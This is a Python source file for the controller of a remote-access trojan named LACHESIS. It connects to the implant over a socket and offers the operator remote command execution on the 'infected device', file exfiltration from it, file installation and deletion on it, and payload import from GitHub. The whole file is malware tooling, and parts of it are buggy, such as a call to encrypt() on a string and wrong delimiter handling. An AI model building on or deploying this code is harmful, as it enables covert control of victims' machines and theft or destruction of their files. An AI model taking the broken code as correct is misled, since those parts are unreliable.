import socket
import threading

from cmd import *


"""NETWORK RULES:
- always base64 encode transmission
-always end transmission with \n
"""
def Hrecieve(client_socket):
    buffer = b''
    while '\n\r\n\r' not in buffer.decode():
        buffer += client_socket.recv(4096) #recieves 4096 bytes
    buffer = buffer.decode() #decodes buffer
    buffer = buffer[:-8] # gets rid of \n\r\n\r
    return buffer

class Host:
    def __init__(self, server_ip='127.0.0.1', port=12345):
        """the client that runs as the command and control for offensive side"""
        self.server_ip = server_ip
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def __del__(self):
        self.socket.close()
        print('thank-you for using LACHESIS...')
    
    def run(self):
        self.socket.connect((self.server_ip, self.port)) #connects to trojan horse
        self.welcome() #prints welcome message to user
        while True:
            try:
                while True: #gets option from user
                    option = input(f'lachesis #:>')
                    if option == '--files' or option == '--cmd': break
                    print('[!] invalid option: must be \'--cmd\' or \'--files\'')
                self.socket.send(option.encode()+b'\n')
                while True:
                    cmdlineprompt = Hrecieve(self.socket) #recieves the command line prompt
                    cmd = input(cmdlineprompt) #gets user input
                    self.socket.send(cmd.encrypt()+b'\n')
            except KeyboardInterrupt as e:
                print('[*] exiting Trojan network...')
        

    def welcome(self):
        line1='\n\n\t\t11\n\t\t'                                         
        line2='10     111011  11010  01  01  11010  00101  00  11011\n\t\t' 
        line3='01     00  10  10     11  10  00     10     11  10\n\t\t'
        line4='00     101010  01     010010  01101  01001  01  01101\n\t\t' 
        line5='10     00  11  11     01  10  10        10  10     10\n\t\t'
        line6='11010  10  01  00101  10  11  01010  01101  01  11001\n\t\t'
        print(f'Welcome To...{line1}{line2}{line3}{line4}{line5}{line6}')
        print('\n\noptions:\n\t--cmd\n\t\t|run command prompt from the host machine- enter exit to exit\n\t\
--files\n\t\t|interactive console for file interactions-\n\t\t\t-upload <file_dir> to upload a file from the infected device\
to the host machine\n\t\t\t-install <file_dir> to install a file on to the infected host from your machine\n\t\t\t-del\
<file_dir> to delete a file on the infected machine\n\t\t\t-import <github_link> to upload a file to the infected device\
from a github repository\n\t\t\t-exit to exit')
        
